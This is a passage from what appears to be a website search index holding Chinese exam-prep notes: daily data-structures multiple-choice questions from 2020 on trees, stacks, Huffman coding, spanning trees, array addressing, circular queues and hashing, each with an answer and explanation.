Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#23-wed","text":"\u4e00\u4e2a\u9ad8\u5ea6\u4e3ah\u7684\u6ee1\u4e8c\u53c9\u6811\u5171\u6709n\u4e2a\u7ed3\u70b9\uff0c\u5176\u4e2d\u6709m\u4e2a\u53f6\u5b50\u7ed3\u70b9\uff0c\u5219 \u6210\u7acb\u3002 [\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66] A. n=h+m B. h+m=2n C. m=h-1 D. n=2m-1 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6ee1\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u548c\u8282\u70b9\u603b\u6570\u6ee1\u8db3\u4e0b\u5217\u5173\u7cfbn = 2^h - 1;\u800c\u4e14\u53f6\u5b50\u8282\u70b9\u5168\u90fd\u4f4d\u4e8e\u7b2cH \u5c42\uff0c\u6240\u4ee5\u53c8\u6709m = 2^(h-1);\u6613\u77e5n = 2*m-1\u3002","title":"2.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#24-thu","text":"\u4e00\u4e2a\u7a7a\u6808\uff0c\u5982\u679c\u6709\u987a\u5e8f\u8f93\u5165\uff1aa1\uff0ca2\uff0ca3\u3002\u3002\u3002an\uff08\u4e2a\u6570\u5927\u4e8e3\uff09\uff0c\u800c\u4e14\u8f93\u51fa\u7b2c\u4e00\u4e2a\u4e3aan-1,\u90a3\u4e48\u6240\u6709\u90fd\u51fa\u6808\u540e\uff0c [\u5409\u6797\u5927\u5b66] A. \u8f93\u51fa\u7684\u6700\u540e\u5143\u7d20\u4e00\u5b9a\u4e3aan B. \u8f93\u51fa\u7684\u6700\u540e\u5143\u7d20\u4e00\u5b9a\u4e3aa1 C. \u4e0d\u80fd\u786e\u5b9a\u5143\u7d20a1~an-2\u8f93\u51fa\u987a\u5e8f D. an-2\u4e00\u5b9a\u6bd4an-3\u5148\u51fa \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1aa1~an\u5fc5\u987b\u662f\u6309\u987a\u5e8f\u5165\u6808\u7684\u3002\u9898\u76ee\u6700\u540e\u8bf4\u7b2c\u4e00\u4e2a\u51fa\u6808\u7684\u662fan-1,\u7531\u8fd9\u91cc\u53ef\u4ee5\u63a8\u6d4b\uff0ca1-an-1\u90fd\u662f\u987a\u5e8f\u5165\u6808\u4e86\uff0c\u81f3\u4e8ean\uff0c\u4ed6\u53ef\u4ee5\u5728a1~an-1\u4efb\u610f\u4e00\u4e2a\u5143\u7d20\u51fa\u6808\u7684\u8fc7\u7a0b\u5165\u6808\u7684\uff0c\u6240\u4ee5an\u8f93\u51fa\u7684\u987a\u5e8f\u4e0d\u80fd\u786e\u5b9a\uff0c\u6545A\uff0cB\u90fd\u9519\uff08\u5bf9\u4e8eB\uff0c\u82e5an\u59cb\u7ec8\u4e0d\u8fdb\u6808\uff0ca1~an-2\u90fd\u51fa\u6808\u4e86\u4ee5\u540e\u518d\u8fdb\u6808\uff0c\u8fd9\u65f6\u5019\u5f39\u51fa\u7684\u662fan\u4e3a\u6700\u540e\u4e00\u4e2a\uff09\u3002C\u9009\u9879\u9519\u8bef\uff0ca1~an-2\u8f93\u51fa\u987a\u5e8f\u662f\u9006\u5e8f\u7684\uff0c\u800can\u53ef\u80fd\u7a7f\u63d2\u5728\u8fd9\u4e2a\u5e8f\u5217\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\u4f4d\u7f6e\u3002\u6240\u4ee5an-2\u4e00\u5b9a\u6bd4an-3\u5148\u51fa\u662f\u6b63\u786e\u7684\uff0c\u9009D\u3002","title":"2.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#25-fri","text":"\u4ee5\u4e0b\u8bf4\u6cd5\u9519\u8bef\u7684\u662f [\u5357\u4eac\u5927\u5b66] A. \u4e00\u822c\u5728\u54c8\u592b\u66fc\u6811\u4e2d\uff0c\u6743\u503c\u8d8a\u5927\u7684\u53f6\u5b50\u79bb\u6839\u7ed3\u70b9\u8d8a\u8fd1 B. \u54c8\u592b\u66fc\u6811\u4e2d\u6ca1\u6709\u5ea6\u6570\u4e3a1\u7684\u5206\u652f\u7ed3\u70b9 C. \u82e5\u521d\u59cb\u68ee\u6797\u4e2d\u5171\u6709n\u68f5\u4e8c\u53c9\u6811\uff0c\u6700\u7ec8\u6c42\u5f97\u7684\u54c8\u592b\u66fc\u6811\u5171\u67092n-1\u4e2a\u7ed3\u70b9 D. \u82e5\u521d\u59cb\u68ee\u6797\u4e2d\u5171\u6709n\u68f5\u4e8c\u53c9\u6811\uff0c\u8fdb\u884c2n-1\u6b21\u5408\u5e76\u540e\u624d\u80fd\u5269\u4e0b\u4e00\u68f5\u6700\u7ec8\u7684\u54c8\u592b\u66fc\u6811 \u6ce8\uff1a\u7ed3\u70b9\u5ea6\u6570\u4e3a\u5176\u5b50\u7ed3\u70b9\u7684\u4e2a\u6570 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6839\u636e\u54c8\u592b\u66fc\u6811\u7684\u6027\u8d28\uff0cA\uff0cB\u663e\u7136\u6b63\u786e\uff0c\u521d\u59cb\u68ee\u6797\u4e2d\u7684n\u68f5\u4e8c\u53c9\u6811\uff0c\u6bcf\u68f5\u6811\u6709\u4e00\u4e2a\u5b64\u7acb\u7684\u7ed3\u70b9\uff0c\u5b83\u4eec\u65e2\u662f\u6839\uff0c\u53c8\u662f\u53f6\u5b50\u3002n\u4e2a\u53f6\u5b50\u7684\u54c8\u592b\u66fc\u6811\u8981\u7ecf\u8fc7n-1\u6b21\u5408\u5e76\uff0c\u4ea7\u751fn-1\u4e2a\u65b0\u7ed3\u70b9\u3002\u6700\u7ec8\u6c42\u5f97\u7684\u54c8\u592b\u66fc\u6811\u67092n-1\u4e2a\u7ed3\u70b9\uff0c\u6240\u4ee5C\u6b63\u786e\u3002\u54c8\u592b\u66fc\u6811\u6bcf\u6b21\u5408\u5e76\u90fd\u4f1a\u5c11\u4e00\u9897\u4e8c\u53c9\u6811\uff0c\u6240\u4ee5\u8fdb\u884cn-1\u6b21\u5408\u5e76\u5373\u53ef\uff0cD\u9519\u8bef\u3002","title":"2.5. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#26-sat","text":"\u6c42\u4e0b\u9762\u5e26\u6743\u56fe\u7684\u6700\u5c0f\uff08\u4ee3\u4ef7\uff09\u751f\u6210\u6811\u65f6\uff0c\u53ef\u80fd\u662f\u514b\u9c81\u65af\u5361\uff08Kruskal\uff09\u7b97\u6cd5\u7b2c2 \u6b21\u9009\u4e2d\u4f46\u4e0d\u662f\u666e\u91cc\u59c6\uff08Prim\uff09\u7b97\u6cd5\uff08\u4eceV4 \u5f00\u59cb\uff09\u7b2c2 \u6b21\u9009\u4e2d\u7684\u8fb9\u662f [\u7535\u5b50\u79d1\u6280\u5927\u5b66] A. (V1,V3) B. (V1,V4) C. (V2,V3) D. (V3,V4) \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aKruskal\u7b97\u6cd5\u662f\u6309\u6743\u503c\u9009\u8fb9\uff0c\u82e5\u9009\u8fb9\u540e\u4e0d\u5f62\u6210\u56de\u8def,\u5219\u4fdd\u7559\u4f5c\u4e3a\u4e00\u6761\u8fb9,\u82e5\u5f62\u6210\u56de\u8def\u5219\u9664\u53bb \u3002Prim\u7b97\u6cd5\u662f\u6bcf\u6b21\u4ece\u5f53\u524d\u7684\u4e8c\u53c9\u6811\u8282\u70b9\u5411\u5916\u5ef6\u4f38\u7684\uff0c\u9009\u62e9\u6743\u503c\u6700\u5c0f\u7684\u8fb9\u3002 \u514b\u9c81\u65af\u5361\uff08Kruskal\uff09\u7b97\u6cd5\u548c\u666e\u91cc\u59c6\uff08Prim\uff09\u7b97\u6cd5\uff08\u4eceV4 \u5f00\u59cb\uff09\u7b2c1\u6b21\u9009\u4e2d\u7684\u8fb9\u90fd\u662f(v1,v4)\uff0c\u6392\u9664B\u3002Kruskal\u7b97\u6cd5\u7b2c\u4e8c\u6b21\u53ef\u4ee5\u9009\u62e9(v1,v3),(v2,v3), (v3,v4); Prim\u7b97\u6cd5\u7b2c\u4e8c\u6b21\u53ef\u4ee5\u9009\u62e9(v1,v3),(v3,v4)\uff0c\u6545\u53ef\u80fd\u662f\u514b\u9c81\u65af\u5361\uff08Kruskal\uff09\u7b97\u6cd5\u7b2c2 \u6b21\u9009\u4e2d\u4f46\u4e0d\u662f\u666e\u91cc\u59c6\uff08Prim\uff09\u7b97\u6cd5\uff08\u4eceV4 \u5f00\u59cb\uff09\u7b2c2 \u6b21\u9009\u4e2d\u7684\u8fb9\u662f(v2,v3)\u3002","title":"2.6. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#27-sun","text":"\u5df2\u77e5\u4e09\u53c9\u6811T \u4e2d6 \u4e2a\u53f6\u7ed3\u70b9\u7684\u6743\u5206\u522b\u662f2\uff0c3\uff0c4\uff0c5\uff0c6\uff0c7\uff0cT \u7684\u5e26\u6743\uff08\u5916\u90e8\uff09\u8def\u5f84\u957f\u5ea6\u6700\u5c0f\u662f [\u5c71\u4e1c\u5927\u5b66] A. 27 B. 46 C. 54 D. 56 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1am\u8868\u793a\u8282\u70b9\u4e2a\u6570 ,k\u8868\u793aK\u53c9\u6811 \u82e5\uff08m-1\uff09%(k-1) = 0\u8bf4\u660e\u4e0d\u9700\u8981\u865a\u6bb5\uff0c\u5426\u5219\u9700\u8981\uff08K-1\uff09-\uff08m-1\uff09%(k-1)\u4e2a\u865a\u6bb5\u3002 \u672c\u9898m=6,k=3\u3002 \u5219\uff086-1\uff09%\uff083-1\uff09=1\u3002\u9700\u8981\u865a\u6bb52 - 1 = 1\u6dfb\u52a0\u7684\u865a\u6bb5\u53ef\u89c6\u4e3a0\u3002\u7136\u540e\u6309\u7167\u4f18\u5148\u53d6\u6700\u5c0f\u7684\u4e09\u4e2a\u7684\u539f\u5219\uff0c\u6784\u9020\u4e09\u53c9\u6811\u3002 \u7ed3\u679c\u4e3a5+14+27=46\u3002","title":"2.7. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Oct/","text":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 Otc # \u76ee\u5f55 # \u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 Otc \u76ee\u5f55 1. Week 1 1. Week 1 # \u5df2\u77e5\u4e00\u68f5\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u7b2c 6 \u5c42\uff08\u8bbe\u6839\u4e3a\u7b2c 1 \u5c42\uff09\u6709 8 \u4e2a\u53f6\u7ed3\u70b9\uff0c\u5219\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u7ed3\u70b9\u4e2a\u6570\u6700\u591a\u662f [\u90d1\u5dde\u5927\u5b66] A. 39 B. 52 C. 111 D. 119 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a1\u3001\u7b2c\u516d\u5c42\u53ea\u6709\u516d\u4e2a\u8282\u70b9\uff0c\u4e14\u4e3a\u53f6\u8282\u70b9\uff08\u5e38\u60f3\u5230\u7684\uff09\u2014\u2014\u8282\u70b9\u6700\u5c11\u60c5\u51b5\uff1b 2\u3001\u7b2c\u516d\u5c42\u6ee1\u8282\u70b9\uff0c\u4f46\u662f\u5176\u4e2d\u7684\u516b\u4e2a\u8282\u70b9\u6ca1\u6709\u5b69\u5b50\u8282\u70b9\uff0c\u56e0\u6b64\u5176\u4e5f\u662f\u53f6\u8282\u70b9\uff08\u4e0d\u6613\u60f3\u5230\uff09\u2014\u2014\u8282\u70b9\u6700\u591a\u60c5\u51b5\uff1b \u672c\u9898\u6b63\u662f\u8003\u5bdf\u7b2c\u4e8c\u79cd\u60c5\u51b5\u3002 \u9996\u5148\uff0c\u524d\u516d\u5c42\u6ee1\u8282\u70b9\uff0c\u90a3\u4e48\u8282\u70b9\u4e2a\u6570\u4e3a\uff1a26-1=63 \u5176\u6b21\uff0c\u7b2c\u516d\u5c42\u670926-1 =32\u4e2a\u8282\u70b9\uff0c\u5176\u4e2d\u67098\u4e2a\u6ca1\u6709\u5b69\u5b50\u8282\u70b9\uff0c\u8bf4\u660e\u7b2c\u4e03\u5c42\u6709\uff0832-8\uff09*2=48\u4e2a\u8282\u70b9\u3002 \u56e0\u6b64\uff0c\u6700\u591a\u60c5\u51b5\u4e0b\u5171\u6709\uff1a63+48=111\u4e2a\u8282\u70b9\u3002","title":"2020 Oct"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Oct/#2020-otc","text":"","title":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 Otc"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Oct/#_1","text":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 Otc \u76ee\u5f55 1. Week 1","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Oct/#1-week-1","text":"\u5df2\u77e5\u4e00\u68f5\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u7b2c 6 \u5c42\uff08\u8bbe\u6839\u4e3a\u7b2c 1 \u5c42\uff09\u6709 8 \u4e2a\u53f6\u7ed3\u70b9\uff0c\u5219\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u7ed3\u70b9\u4e2a\u6570\u6700\u591a\u662f [\u90d1\u5dde\u5927\u5b66] A. 39 B. 52 C. 111 D. 119 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a1\u3001\u7b2c\u516d\u5c42\u53ea\u6709\u516d\u4e2a\u8282\u70b9\uff0c\u4e14\u4e3a\u53f6\u8282\u70b9\uff08\u5e38\u60f3\u5230\u7684\uff09\u2014\u2014\u8282\u70b9\u6700\u5c11\u60c5\u51b5\uff1b 2\u3001\u7b2c\u516d\u5c42\u6ee1\u8282\u70b9\uff0c\u4f46\u662f\u5176\u4e2d\u7684\u516b\u4e2a\u8282\u70b9\u6ca1\u6709\u5b69\u5b50\u8282\u70b9\uff0c\u56e0\u6b64\u5176\u4e5f\u662f\u53f6\u8282\u70b9\uff08\u4e0d\u6613\u60f3\u5230\uff09\u2014\u2014\u8282\u70b9\u6700\u591a\u60c5\u51b5\uff1b \u672c\u9898\u6b63\u662f\u8003\u5bdf\u7b2c\u4e8c\u79cd\u60c5\u51b5\u3002 \u9996\u5148\uff0c\u524d\u516d\u5c42\u6ee1\u8282\u70b9\uff0c\u90a3\u4e48\u8282\u70b9\u4e2a\u6570\u4e3a\uff1a26-1=63 \u5176\u6b21\uff0c\u7b2c\u516d\u5c42\u670926-1 =32\u4e2a\u8282\u70b9\uff0c\u5176\u4e2d\u67098\u4e2a\u6ca1\u6709\u5b69\u5b50\u8282\u70b9\uff0c\u8bf4\u660e\u7b2c\u4e03\u5c42\u6709\uff0832-8\uff09*2=48\u4e2a\u8282\u70b9\u3002 \u56e0\u6b64\uff0c\u6700\u591a\u60c5\u51b5\u4e0b\u5171\u6709\uff1a63+48=111\u4e2a\u8282\u70b9\u3002","title":"1. Week 1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/","text":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 Sep # \u76ee\u5f55 # \u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 Sep \u76ee\u5f55 1. Week 3 1.1. Tue 1.2. Wed 2. Week 4 2.1. Wed 2.2. Sun 1. Week 3 # 1.1. Tue # \u82e5\u4e8c\u7ef4\u6570\u7ec4arr[1..M\uff0c1..N]\u7684\u9996\u5730\u5740\u4e3abase\uff0c\u6570\u7ec4\u5143\u7d20\u6309\u5217\u5b58\u50a8\u4e14\u6bcf\u4e2a\u5143\u7d20\u5360\u7528K\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u5219\u5143\u7d20arr[i\uff0cj]\u5728\u8be5\u6570\u7ec4\u7a7a\u95f4\u7684\u5730\u5740\u4e3a [\u53a6\u95e8\u5927\u5b66-903-2015] A\uff0ebase+((i-1) M+j-1) K B\uff0ebase+((i-1) N+j-1) K C\uff0ebase+((j-1) M+i-1) K D\uff0ebase+((j-1) N+i-1) K \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u4e8c\u7ef4\u6570\u7ec4arr[1..M\uff0c1..N]\u7684\u5143\u7d20\u53ef\u4ee5\u6309\u884c\u5b58\u50a8\uff0c\u4e5f\u53ef\u4ee5\u6309\u5217\u5b58\u50a8\u3002\u6309\u5217\u5b58\u50a8\u65f6\uff0c\u5143\u7d20\u7684\u6392\u5217\u6b21\u5e8f\u4e3a\uff0c\u5148\u662f\u7b2c\u4e00\u5217\u7684\u6240\u6709\u5143\u7d20\uff0c\u7136\u540e\u662f\u7b2c\u4e8c\u5217\u7684\u6240\u6709\u5143\u7d20\uff0c\u6700\u540e\u662f\u7b2cN\u5217\u7684\u6240\u6709\u5143\u7d20\u3002\u6bcf\u4e00\u5217\u7684\u5143\u7d20\u5219\u6309\u884c\u53f7\u4ece\u5c0f\u5230\u5927\u4f9d\u6b21\u6392\u5217\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u5143\u7d20arr[i\uff0cj]\uff0c\u5176\u5b58\u50a8\u4f4d\u7f6e\u5982\u4e0b\u8ba1\u7b97\uff1a\u5148\u8ba1\u7b97\u5176\u524d\u9762j-1\u5217\u4e0a\u7684\u5143\u7d20\u603b\u6570\uff0c\u4e3a(j-1)*M\uff0c\u7136\u540e\u8ba1\u7b97\u7b2cj\u5217\u4e0a\u6392\u5217\u5728arr[i\uff0cj]\u4e4b\u524d\u7684\u5143\u7d20\u6570\u76ee\uff0c\u4e3ai-1\uff0c\u56e0\u6b64arr[i\uff0cj]\u7684\u5730\u5740\u4e3abase+((j-1)*M+i-1)*K\u3002 1.2. Wed # \u6570\u7ec4Q\uff3bn\uff3d\u7528\u6765\u8868\u793a\u4e00\u4e2a\u5faa\u73af\u961f\u5217,f\u4e3a\u5f53\u524d\u961f\u5217\u5934\u5143\u7d20\u7684\u524d\u4e00\u4f4d\u7f6e,r\u4e3a\u961f\u5c3e\u5143\u7d20\u7684\u4f4d\u7f6e,\u5047\u5b9a\u961f\u5217\u4e2d\u5143\u7d20\u7684\u4e2a\u6570\u5c0f\u4e8en,\u8ba1\u7b97\u961f\u5217\u4e2d\u5143\u7d20\u4e2a\u6570\u7684\u516c\u5f0f\u4e3a [\u6d59\u6c5f\u7406\u5de5\u5927\u5b66-991-2011] A\uff0er\uff0df B\uff0e\uff08n\uff0bf\uff0dr\uff09% n C\uff0en\uff0br\uff0df D\uff0e\uff08n\uff0br\uff0df\uff09% n \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u5f53r>f\u65f6\uff0c\u4e2a\u6570x = r - f \uff0c\u5f53r < f\u65f6\uff0cx = n + r - f \uff0c\u4e8c\u8005\u53ef\u4ee5\u7edf\u4e00\u4e3aD\u9009\u9879\u3002 2. Week 4 # 2.1. Wed # \u8bbe\u54c8\u5e0c\u8868\u957f\u4e3a14\uff0c\u54c8\u5e0c\u51fd\u6570\u662fH(key)=key%11,\u8868\u4e2d\u5df2\u6709\u6570\u636e\u7684\u5173\u952e\u5b57\u4e3a15,38,61,84\u5171\u56db\u4e2a\uff0c\u73b0\u8981\u5c06\u5173\u952e\u5b57\u4e3a26\u7684\u7ed3\u70b9\u52a0\u5230\u8868\u4e2d\uff0c\u7528\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217\u6cd5\u89e3\u51b3\u51b2\u7a81\uff0c\u5219\u653e\u5165\u7684\u4f4d\u7f6e\u662f [\u6b66\u6c49\u79d1\u6280\u5927\u5b66-856-2013] A\uff0e8 B\uff0e3 C\uff0e2 D\uff0e9 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1aH(15)=15%11=4 H(38)=38%11 = 5 H(61)=61%11 = 6 H(84)=84%11 = 7 H(26)=26%11=4 \u5173\u952e\u5b5726\u7684\u7ed3\u70b9\u548c\u5173\u952e\u5b57\u4e3a15 \u7684\u7ed3\u70b9\u90fd\u653e\u5728\u54c8\u5e0c\u88684\u7684\u4f4d\u7f6e\uff0c\u4ea7\u751f\u51b2\u7a81 \u5229\u7528\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217\u6cd5\u516c\u5f0fH(key)=\uff08key+dii\uff09%11 dii=1^2 \uff0c-(1^2)\uff0c2^2\uff0c-(2^2)..... \u5f53dii\u53d61^2\u65f6\uff1a H(26)=\uff0826+1^2\uff09%11 = 5 \u548c H(38)=38%11 =5 \u51b2\u7a81 \u5f53dii\u53d6-1^2\u65f6\uff1aH(26)=\uff0826-(1^2)\uff09%11 = 3 \u4e0d\u4e0e\u5176\u4ed6\u5173\u952e\u5b57\u7684\u54c8\u5e0c\u5730\u5740\u51b2\u7a81\uff0c\u6545\u5c06\u5173\u952e\u5b5726\u7684\u7ed3\u70b9\u653e\u5728\u88683\u4f4d\u7f6e\u3002 2.2. Sun # \u5728\u6709N\u4e2a\u53f6\u5b50\u8282\u70b9\u7684\u54c8\u592b\u66fc\u6811\u4e2d\uff0c\u5176\u8282\u70b9\u603b\u6570\u4e3a [\u90d1\u5dde\u5927\u5b66] A. \u4e0d\u786e\u5b9a B. 2N-1 C. 2N+1 D. 2N \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u54c8\u5f17\u66fc\u6811\u4e5f\u662f\u4e8c\u53c9\u6811\uff0c\u800c\u4e14\u6811\u4e2d\u53ea\u6709\u53f6\u5b50\u7ed3\u70b9\u8ddf\u5ea6\u4e3a2\u7684\u7ed3\u70b9\uff0c\u7531\u4e8c\u53c9\u6811\u7684\u6027\u8d28\u53ef\u5f97\uff1a\u5ea6\u4e3a2\u7684\u7ed3\u70b9\u6570\u91cf\u7b49\u4e8e\u53f6\u5b50\u7ed3\u70b9\u6570\u91cf-1\uff0c\u56e0\u6b64\u7ed3\u70b9\u603b\u6570\u4e3an+n-1\u3002","title":"2020 Sep"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#2020-sep","text":"","title":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 Sep"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#_1","text":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 Sep \u76ee\u5f55 1. Week 3 1.1. Tue 1.2. Wed 2. Week 4 2.1. Wed 2.2. Sun","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#1-week-3","text":"","title":"1. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#11-tue","text":"\u82e5\u4e8c\u7ef4\u6570\u7ec4arr[1..M\uff0c1..N]\u7684\u9996\u5730\u5740\u4e3abase\uff0c\u6570\u7ec4\u5143\u7d20\u6309\u5217\u5b58\u50a8\u4e14\u6bcf\u4e2a\u5143\u7d20\u5360\u7528K\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u5219\u5143\u7d20arr[i\uff0cj]\u5728\u8be5\u6570\u7ec4\u7a7a\u95f4\u7684\u5730\u5740\u4e3a [\u53a6\u95e8\u5927\u5b66-903-2015] A\uff0ebase+((i-1) M+j-1) K B\uff0ebase+((i-1) N+j-1) K C\uff0ebase+((j-1) M+i-1) K D\uff0ebase+((j-1) N+i-1) K \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u4e8c\u7ef4\u6570\u7ec4arr[1..M\uff0c1..N]\u7684\u5143\u7d20\u53ef\u4ee5\u6309\u884c\u5b58\u50a8\uff0c\u4e5f\u53ef\u4ee5\u6309\u5217\u5b58\u50a8\u3002\u6309\u5217\u5b58\u50a8\u65f6\uff0c\u5143\u7d20\u7684\u6392\u5217\u6b21\u5e8f\u4e3a\uff0c\u5148\u662f\u7b2c\u4e00\u5217\u7684\u6240\u6709\u5143\u7d20\uff0c\u7136\u540e\u662f\u7b2c\u4e8c\u5217\u7684\u6240\u6709\u5143\u7d20\uff0c\u6700\u540e\u662f\u7b2cN\u5217\u7684\u6240\u6709\u5143\u7d20\u3002\u6bcf\u4e00\u5217\u7684\u5143\u7d20\u5219\u6309\u884c\u53f7\u4ece\u5c0f\u5230\u5927\u4f9d\u6b21\u6392\u5217\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u5143\u7d20arr[i\uff0cj]\uff0c\u5176\u5b58\u50a8\u4f4d\u7f6e\u5982\u4e0b\u8ba1\u7b97\uff1a\u5148\u8ba1\u7b97\u5176\u524d\u9762j-1\u5217\u4e0a\u7684\u5143\u7d20\u603b\u6570\uff0c\u4e3a(j-1)*M\uff0c\u7136\u540e\u8ba1\u7b97\u7b2cj\u5217\u4e0a\u6392\u5217\u5728arr[i\uff0cj]\u4e4b\u524d\u7684\u5143\u7d20\u6570\u76ee\uff0c\u4e3ai-1\uff0c\u56e0\u6b64arr[i\uff0cj]\u7684\u5730\u5740\u4e3abase+((j-1)*M+i-1)*K\u3002","title":"1.1. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#12-wed","text":"\u6570\u7ec4Q\uff3bn\uff3d\u7528\u6765\u8868\u793a\u4e00\u4e2a\u5faa\u73af\u961f\u5217,f\u4e3a\u5f53\u524d\u961f\u5217\u5934\u5143\u7d20\u7684\u524d\u4e00\u4f4d\u7f6e,r\u4e3a\u961f\u5c3e\u5143\u7d20\u7684\u4f4d\u7f6e,\u5047\u5b9a\u961f\u5217\u4e2d\u5143\u7d20\u7684\u4e2a\u6570\u5c0f\u4e8en,\u8ba1\u7b97\u961f\u5217\u4e2d\u5143\u7d20\u4e2a\u6570\u7684\u516c\u5f0f\u4e3a [\u6d59\u6c5f\u7406\u5de5\u5927\u5b66-991-2011] A\uff0er\uff0df B\uff0e\uff08n\uff0bf\uff0dr\uff09% n C\uff0en\uff0br\uff0df D\uff0e\uff08n\uff0br\uff0df\uff09% n \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u5f53r>f\u65f6\uff0c\u4e2a\u6570x = r - f \uff0c\u5f53r < f\u65f6\uff0cx = n + r - f \uff0c\u4e8c\u8005\u53ef\u4ee5\u7edf\u4e00\u4e3aD\u9009\u9879\u3002","title":"1.2. 